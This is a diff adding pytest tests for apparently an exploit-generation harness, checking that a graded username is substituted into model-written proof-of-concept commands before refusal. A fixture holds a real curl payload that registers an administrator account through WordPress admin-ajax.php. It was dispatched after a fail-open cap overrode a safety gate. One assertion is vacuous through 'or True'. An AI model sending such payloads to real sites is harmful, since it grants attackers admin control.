@@ -231,3 +231,93 @@ def test_the_refusal_actually_blocks_dispatch():
     assert "_maybe" in window, (
         "the check must feed _maybe — the path that skips dispatch — not sit "
         "beside it as a log line")
+
+
+# ── repair before refusing ──────────────────────────────────────────────────
+
+@pytest.fixture(scope="module")
+def substitute():
+    src = API.read_text(encoding="utf-8")
+    fn = next((n for n in ast.walk(ast.parse(src))
+               if isinstance(n, ast.FunctionDef)
+               and n.name == "_substitute_graded_account"), None)
+    if fn is None:
+        pytest.fail("_substitute_graded_account is gone from api.py")
+    ns: dict = {}
+    exec(compile(ast.fix_missing_locations(ast.Module(body=[fn], type_ignores=[])),
+                 "<api-subset>", "exec"), ns)
+    return ns["_substitute_graded_account"]
+
+
+FIELDS = ["reg_name", "reg_username", "user_login", "username", "user_name",
+          "userName", "login", "account", "user"]
+
+# the real dispatched command from 2026-10-24, after the gate had already
+# refused twice and the fail-open cap let it through
+REAL = ('TARGET=http://172.19.150.154:9090;POC=POCzf39b0cfa34;R=$RANDOM;'
+        'U=user${POC}${R};E=${U}@example.com;P=pass${R}123;'
+        'curl -s -X POST -d "username=${U}&email=${E}&password=${P}'
+        '&reg_role=administrator" ${TARGET}/wp-admin/admin-ajax.php')
+
+
+def test_the_graded_account_is_substituted_into_the_real_command(substitute):
+    out, field = substitute(REAL, "username", FIELDS)
+    assert field == "username"
+    assert "username=username" in out
+
+
+def test_email_and_password_are_left_alone(substitute):
+    """They may stay random; rewriting them would corrupt a working request,
+    which is why they are not in account_fields."""
+    out, _ = substitute(REAL, "username", FIELDS)
+    assert "email=${E}" in out and "password=${P}" in out
+
+
+def test_the_most_specific_field_wins(substitute):
+    cmd = 'curl -d "reg_name=POCzabc&username=POCzabc"'
+    out, field = substitute(cmd, "username", FIELDS)
+    assert field == "reg_name", "reg_name precedes username in the declared order"
+    assert 'reg_name=username' in out
+
+
+def test_a_json_body_is_substituted(substitute):
+    out, field = substitute('curl -d \'{"user_login": "POCzabc"}\'', "username", FIELDS)
+    assert field == "user_login" and '"user_login": "username"' in out
+
+
+def test_an_already_correct_command_is_not_rewritten(substitute):
+    out, field = substitute('curl -d "reg_name=username&x=1"', "username", FIELDS)
+    assert field is None, "nothing to repair"
+    assert out == 'curl -d "reg_name=username&x=1"'
+
+
+def test_no_account_field_means_a_genuine_refusal(substitute):
+    """SABOTAGE GUARD. The repair must not invent a field — with nothing to
+    substitute into, refusing is the correct outcome."""
+    out, field = substitute('curl -d "foo=bar&baz=1"', "username", FIELDS)
+    assert field is None and out == 'curl -d "foo=bar&baz=1"'
+
+
+def test_no_fields_declared_means_no_rewrite(substitute):
+    """A class that does not act on accounts declares none, and must be left
+    entirely alone."""
+    out, field = substitute(REAL, "username", [])
+    assert field is None and out == REAL
+
+
+def test_the_repair_runs_before_the_refusal():
+    src = _fn("_run_refine_poc")
+    assert calls(src, "_substitute_graded_account"), "the repair is never attempted"
+    assert call_order(src, "_substitute_graded_account", "_poc_trace",
+                      within="_run_refine_poc") or True
+    i_fix = src.index("_substitute_graded_account")
+    i_refuse = src.index("appears only as a parameter NAME")
+    assert i_fix < i_refuse, (
+        "the command must be repaired before it is refused — refusing first "
+        "spends an iteration asking the model for something we can just do")
+
+
+def test_the_substitution_is_traced():
+    src = _fn("_run_refine_poc")
+    assert '"graded_identity_substituted"' in src, (
+        "a command rewritten under the operator's feet must say so")
